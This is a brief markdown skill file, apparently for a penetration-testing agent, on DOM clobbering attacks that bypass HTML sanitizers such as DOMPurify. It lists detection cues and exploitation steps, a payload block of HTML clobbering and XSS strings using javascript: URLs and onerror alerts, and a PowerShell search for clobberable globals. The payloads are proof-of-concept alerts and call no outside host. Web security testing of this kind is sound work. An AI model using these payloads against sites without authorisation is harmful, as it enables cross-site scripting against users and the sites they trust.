---
name: dom-clobbering
description: DOM clobbering — HTML IDs/names shadowing globals (window.foo), bypassing sanitizers to create XSS sinks. Use when the app has client-side sanitization (DOMPurify) or reads window.<name> or document.<name> into sinks.
category: client-side
---

# DOM Clobbering

## Detection
- JS reads globals: `window.X`, `document.X`, `form.action`, `location`, `config`, `debug`.
- HTML injection points (even sanitized) where attributes `id`/`name` survive (DOMPurify allows id/name by default on many elements).
- Look for gadgets: `window.currentScript`, `window.alert`, `<form id=x><input name=action>` overriding `x.action`.

## Exploitation
1. **Global override**: `<a id="config">` creates `window.config` shadowing real config.
2. **Form gadget**: `<form id=f><input name=action value=javascript:alert(1)>` → `f.action` becomes attacker URL; if code does `location = form.action`, XSS.
3. **Clobber arrays**: `<a id="x"><a id="x">` → `window.x` becomes HTMLCollection (breaks typeof checks that expect object → passes falsy branches).
4. **DOMPurify bypass**: `<form id=...><input name=...>` persists in sanitized output → gadget executes post-sanitization.

## Payloads
```html
<a id="config"><a id="config"><img src=x onerror=alert(1)>
<form id=f><input name=action value="javascript:alert(document.domain)">
<a id="debug"><a id="debug">
<form id="x" action="javascript:alert(1)"><input name="action">
```

## Tool Commands (Windows)
```powershell
# search for clobberable global reads
Select-String -Pattern "window\.[a-zA-Z_]+|document\.[a-zA-Z_]+" -Path "app.js" | ForEach-Object {$_.Matches.Value} | Sort-Object -Unique
```

## Verification & Evidence
- Prove a sanitizer bypass led to XSS, or a global gadget reads attacker-controlled value into a sink.
- Evidence: payload + rendered DOM + console proof.